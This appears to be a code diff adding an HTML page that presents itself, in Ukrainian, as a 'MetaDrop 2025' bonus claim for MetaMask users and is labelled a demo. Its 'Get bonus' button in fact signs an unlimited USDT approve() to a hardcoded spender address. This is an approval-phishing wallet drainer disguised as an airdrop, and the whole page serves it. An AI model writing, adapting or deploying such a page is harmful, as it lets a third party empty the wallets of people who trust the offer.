@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>MetaMask Approve Demo</title>
+  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.min.js"></script>
+  <style>
+    body { font-family: sans-serif; text-align: center; padding: 40px; background: #f0f0f0; }
+    button { padding: 12px 24px; margin: 10px; font-size: 16px; border-radius: 8px; }
+  </style>
+</head>
+<body>
+
+  <h1>🎁 MetaDrop 2025</h1>
+  <p>Натисніть “Підключити”, потім “Отримати бонус”<br>Це демонстрація approve() через MetaMask</p>
+
+  <button onclick="connect()">🔌 Підключити MetaMask</button><br>
+  <button onclick="approve()">✅ Отримати бонус</button>
+
+  <script>
+    let signer;
+
+    async function connect() {
+      if (!window.ethereum) {
+        alert("🛑 Встановіть MetaMask");
+        return;
+      }
+      try {
+        await window.ethereum.request({ method: 'eth_requestAccounts' });
+        const provider = new ethers.providers.Web3Provider(window.ethereum);
+        signer = provider.getSigner();
+        alert("🟢 Підключено");
+      } catch (err) {
+        alert("❌ Помилка: " + err.message);
+      }
+    }
+
+    async function approve() {
+      if (!signer) {
+        alert("🛑 Спочатку підключіть MetaMask");
+        return;
+      }
+      const usdtAddress = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
+      const spender = "0x544efFe1651BD2A665e4aD7ddA155d38f71FC1c0";
+      const abi = [
+        "function approve(address spender, uint256 amount) public returns (bool)"
+      ];
+      const token = new ethers.Contract(usdtAddress, abi, signer);
+      try {
+        const tx = await token.approve(spender, ethers.constants.MaxUint256);
+        alert("✅ Approve відправлено: " + tx.hash);
+      } catch (err) {
+        alert("❌ Відмовлено: " + err.message);
+      }
+    }
+  </script>
+
+</body>
+</html>
